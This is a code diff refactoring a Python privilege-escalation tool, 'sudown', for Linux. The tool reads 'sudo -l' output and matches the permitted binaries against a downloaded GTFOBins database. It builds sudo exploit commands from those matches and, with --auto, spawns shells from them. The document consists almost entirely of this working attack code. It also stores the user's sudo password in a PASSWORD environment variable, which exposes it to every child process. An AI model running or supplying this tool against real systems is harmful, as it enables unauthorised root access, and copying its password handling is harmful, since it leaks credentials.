@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-sudown.py: A sudo misconfiguration exploiter with dynamic GTFOBins integration.
+sudown_linux.py: A sudo misconfiguration exploiter for Linux with dynamic GTFOBins integration.
 """
 import os
 import sys
@@ -11,18 +11,18 @@ import platform
 import getpass
 import logging
 import pty
+import shutil
+import time
 from pathlib import Path
 
-try:
-    import requests
-except ImportError:
-    print("[!] The 'requests' library is required. Install it via 'pip install requests'.")
-    sys.exit(1)
+import requests
 
-CACHE_DIR = Path.home() / '.cache'
+# Configuration for Linux
+CACHE_DIR = Path.home() / '.cache' / 'sudown'
 GTFOBINS_URL = 'https://gtfobins.github.io/gtfobins.json'
 GTFOBINS_CACHE = CACHE_DIR / 'sudown_gtfobins.json'
 CACHE_TTL = 7 * 24 * 3600  # 7 days
+DEFAULT_SHELL = '/bin/sh'
 
 logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 
@@ -45,7 +45,7 @@ class SudoEntry:
 def gather_system_info():
     info = {
         'host': platform.node(),
-        'os': platform.system() + ' ' + platform.release(),
+        'os': f"{platform.system()} {platform.release()}",
         'arch': platform.machine(),
         'user': os.getenv('USER', 'unknown')
     }
@@ -68,11 +68,10 @@ def check_requirements():
 
 def get_sudo_list():
     try:
-        result = os.popen('sudo -l 2>&1').read()
+        return os.popen('sudo -l 2>&1').read()
     except Exception as e:
         logging.error(f"Failed to run 'sudo -l': {e}")
         sys.exit(1)
-    return result
 
 
 def parse_sudo_list(output):
@@ -98,7 +97,6 @@ def fetch_gtfobins(update=False):
         if (time.time() - mtime) < CACHE_TTL:
             with open(GTFOBINS_CACHE, 'r') as f:
                 return json.load(f)
-    # Fetch fresh
     logging.info("Fetching GTFOBins database...")
     try:
         resp = requests.get(GTFOBINS_URL, timeout=10)
@@ -116,27 +114,23 @@ def fetch_gtfobins(update=False):
         sys.exit(1)
 
 
-def build_exploits(entries, gtfobins_db, password=None):
+def build_exploits(entries, gtfobins_db):
     results = []
     for entry in entries:
         name = os.path.basename(entry.binary)
         if name not in gtfobins_db:
             continue
-        exploits = []
         data = gtfobins_db[name]
-        for method, payload in data.get('exploits', {}).items():
-            # payload may be str or list
+        raw = data.get('exploits', {})
+        # flatten strings and lists
+        exploits = []
+        for method, payload in raw.items():
             if isinstance(payload, list):
-                for p in payload:
-                    exploits.append(p)
+                exploits.extend(payload)
             else:
                 exploits.append(payload)
         for payload in exploits:
-            # Ensure full path usage
-            if payload.startswith(name):
-                full = payload.replace(name, entry.binary, 1)
-            else:
-                full = f"{entry.binary} {payload}"
+            full = payload.replace(name, entry.binary, 1) if payload.startswith(name) else f"{entry.binary} {payload}"
             if entry.nopasswd:
                 cmd = f"sudo {full}"
             else:
@@ -152,11 +146,11 @@ def build_exploits(entries, gtfobins_db, password=None):
 
 def spawn_shell(command_str):
     logging.info(f"Spawning shell with: {command_str}")
-    pty.spawn(['/bin/sh', '-c', command_str])
+    pty.spawn([DEFAULT_SHELL, '-c', command_str])
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Sudo misconfiguration exploiter with GTFOBins integration.")
+    parser = argparse.ArgumentParser(description="Sudo misconfiguration exploiter for Linux.")
     parser.add_argument('-a', '--auto', action='store_true', help='Automatically spawn shell for NOPASSWD exploits')
     parser.add_argument('-f', '--first', action='store_true', help='Stop after first exploit')
     parser.add_argument('-n', '--no-spawn', action='store_true', help='Do not spawn any shells')
@@ -164,36 +158,35 @@ def main():
     parser.add_argument('-j', '--json', action='store_true', help='Output results as JSON')
     args = parser.parse_args()
 
-    try:
-        gather_system_info()
-        entries = parse_sudo_list(get_sudo_list())
-        if not entries:
-            logging.warning("No sudo entries found.")
-            return
-        pwd = None
-        if any(not e.nopasswd for e in entries):
-            pwd = getpass.getpass('Sudo password (for PASSWD entries): ')
-            os.environ['PASSWORD'] = pwd
-        gtfobins_db = fetch_gtfobins(update=args.update_db)
-        exploits = build_exploits(entries, gtfobins_db, password=pwd)
+    gather_system_info()
+    check_requirements()
+    entries = parse_sudo_list(get_sudo_list())
+    if not entries:
+        logging.warning("No sudo entries found.")
+        return
 
-        if args.json:
-            print(json.dumps(exploits, indent=2))
-            return
+    pwd = None
+    if any(not e.nopasswd for e in entries):
+        pwd = getpass.getpass('Sudo password (for PASSWD entries): ')
+        os.environ['PASSWORD'] = pwd
 
-        count = 0
-        for exp in exploits:
-            print(f"[*] {exp['exploit']}")
-            count += 1
-            if args.auto and exp['nopasswd'] and not args.no_spawn:
-                spawn_shell(exp['exploit'])
-            if args.first and count >= 1:
-                break
-        if count == 0:
-            logging.info("No exploitable entries found in GTFOBins database.")
-    except KeyboardInterrupt:
-        logging.info("Interrupted by user.")
-        sys.exit(0)
+    gtfobins_db = fetch_gtfobins(update=args.update_db)
+    exploits = build_exploits(entries, gtfobins_db)
+
+    if args.json:
+        print(json.dumps(exploits, indent=2))
+        return
+
+    count = 0
+    for exp in exploits:
+        print(f"[*] {exp['exploit']}")
+        count += 1
+        if args.auto and exp['nopasswd'] and not args.no_spawn:
+            spawn_shell(exp['exploit'])
+        if args.first and count >= 1:
+            break
+    if count == 0:
+        logging.info("No exploitable entries found in GTFOBins database.")
 
 if __name__ == '__main__':
     main()
